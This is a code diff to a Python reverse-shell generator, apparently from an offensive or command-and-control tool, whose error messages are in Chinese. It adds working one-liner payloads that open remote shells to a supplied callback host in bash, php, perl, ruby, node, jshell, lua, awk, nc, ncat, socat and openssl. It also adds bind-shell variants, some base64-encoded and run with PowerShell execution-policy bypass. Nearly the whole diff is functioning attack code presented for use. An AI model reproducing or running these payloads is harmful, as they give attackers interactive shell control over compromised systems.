@@ -14,7 +14,11 @@ ONELINER_KINDS = {
     "http_beacon": ("curl_beacon",),
     "https_beacon": ("curl_beacon",),
     "websocket": ("curl_beacon",),
-    "tcp_reverse": ("bash", "python", "powershell"),
+    "tcp_reverse": (
+        "bash", "bash_udp", "python", "php", "perl", "ruby", "node", "java",
+        "lua", "awk", "nc", "ncat", "socat", "openssl", "powershell",
+    ),
+    "tcp_bind": ("nc_bind", "ncat_bind", "socat_bind", "python_bind", "powershell_bind"),
 }
 
 
@@ -24,7 +28,11 @@ def listener_type(metadata: dict[str, Any]) -> str:
 
 
 def callback_host(metadata: dict[str, Any], override: str = "") -> str:
-    value = override.strip() or str(metadata.get("callback_host") or metadata.get("bind_host") or "")
+    value = override.strip() or str(
+        metadata.get("target_host")
+        if listener_type(metadata) == "tcp_bind"
+        else metadata.get("callback_host") or metadata.get("bind_host") or ""
+    )
     if value in {"", "0.0.0.0", "::", "127.0.0.1", "localhost"}:
         raise ValueError("请输入目标能够访问的回连地址")
     return value
@@ -52,6 +60,8 @@ def generate_oneliner(
         raise ValueError("监听端口无效")
     if kind == "bash":
         return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
+    if kind == "bash_udp":
+        return f"bash -c 'sh -i >& /dev/udp/{host}/{port} 0>&1'"
     if kind == "python":
         script = (
             "import socket,os,pty;"
@@ -67,6 +77,51 @@ def generate_oneliner(
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             "$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);"
             "$s.Write($r,0,$r.Length);$s.Flush()};$c.Close()"
+        )
+        encoded = base64.b64encode(script.encode("utf-16le")).decode()
+        return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
+    if kind == "php":
+        return f"php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    if kind == "perl":
+        return f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+    if kind == "ruby":
+        return f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    if kind == "node":
+        return f"node -e 'const n=require(\"net\"),s=require(\"child_process\").spawn(\"/bin/sh\",[]),c=new n.Socket();c.connect({port},\"{host}\",()=>{{c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)}})'"
+    if kind == "java":
+        return f"jshell -q <<< 'new ProcessBuilder(\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\").start();'"
+    if kind == "lua":
+        return f"lua -e 'local s=require(\"socket\").tcp();s:connect(\"{host}\",{port});while true do local r,x=s:receive();local f=io.popen(r,\"r\");local b=f:read(\"*a\");f:close();s:send(b);end'"
+    if kind == "awk":
+        return f"awk 'BEGIN {{s=\"/inet/tcp/0/{host}/{port}\";while(42){{do{{printf \"shell>\"|&s;s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")}}close(s)}}' /dev/null"
+    if kind == "nc":
+        return f"nc {host} {port} -e /bin/sh"
+    if kind == "ncat":
+        return f"ncat {host} {port} -e /bin/sh"
+    if kind == "socat":
+        return f"socat TCP:{host}:{port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
+    if kind == "openssl":
+        return f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s"
+    if kind == "nc_bind":
+        return f"nc -lvnp {port} -e /bin/sh"
+    if kind == "ncat_bind":
+        return f"ncat -lvnp {port} -e /bin/sh"
+    if kind == "socat_bind":
+        return f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
+    if kind == "python_bind":
+        script = (
+            "import socket,os,pty;s=socket.socket();"
+            f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));"
+            "s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn('/bin/sh')"
+        )
+        encoded = base64.b64encode(script.encode()).decode()
+        return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
+    if kind == "powershell_bind":
+        script = (
+            f"$l=[Net.Sockets.TcpListener]::new([Net.IPAddress]::Any,{port});$l.Start();"
+            "$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
+            "while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetString($b,0,$i);"
+            "$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);$s.Write($r,0,$r.Length)}"
         )
         encoded = base64.b64encode(script.encode("utf-16le")).decode()
         return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
